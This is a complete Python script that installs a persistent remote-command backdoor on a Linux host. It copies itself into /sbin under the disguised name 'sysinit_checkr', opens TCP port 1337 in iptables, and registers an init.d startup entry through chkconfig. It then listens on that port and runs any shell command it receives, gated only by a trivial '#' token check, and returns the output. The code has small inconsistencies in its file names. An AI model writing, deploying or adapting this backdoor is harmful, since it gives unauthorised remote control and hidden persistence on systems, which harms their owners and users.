#!/usr/bin/env python

import socket, subprocess, os, sys

PORT = 1337
ADDR = ''
addr = (ADDR, PORT)

dpkg = subprocess.Popen("dpkg -l", stdout=subprocess.PIPE, shell=True)
out, err = dpkg.communicate()
if 'chkconfig' not in out:
	os.system("apt-get install chkconfig")

sbin = subprocess.Popen('ls /sbin', stdout=subprocess.PIPE, shell=True)
out, err = sbin.communicate()
if 'sysinit_checkr' not in out:
	os.system("cp {0} /sbin/sysinit_checkr".format(sys.argv[0]))
	os.system("chmod +x /sbin/sysinit_checkr")

state = subprocess.Popen('iptables -L', stdout=subprocess.PIPE, shell=True)
out, err = state.communicate()
if "1337" not in out:
	os.system("iptables -I INPUT -p tcp --dport 1337 -j ACCEPT")

init = subprocess.Popen('ls /etc/init.d', stdout=subprocess.PIPE, shell=True)
out, err = init. communicate()
if 'systinit_checkr' not in out:
	os.system("echo '/sbin/battery_state' > /etc/init.d/sysinit_checkr")
	os.system("chmod +x /etc/init.d/sysinit_checkr")

os.system("chkconfig --level 2345 sysinit_checkr on")

data = ''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(addr)
s.listen(10)
while True:
	conn, cli_addr = s.accept()
	while True:
		data = conn.recv(1024)
		if not data:
			break
		if "#" not in data:
			break
		else:
			if "t" not in data.split('#')[1]:
				break
		proc = subprocess.Popen(data.split('#')[0], stdout=subprocess.PIPE, shell=True)
		out, err = proc.communicate()
		conn.sendall(str(out)+"\n")
	conn.close()
s.close()
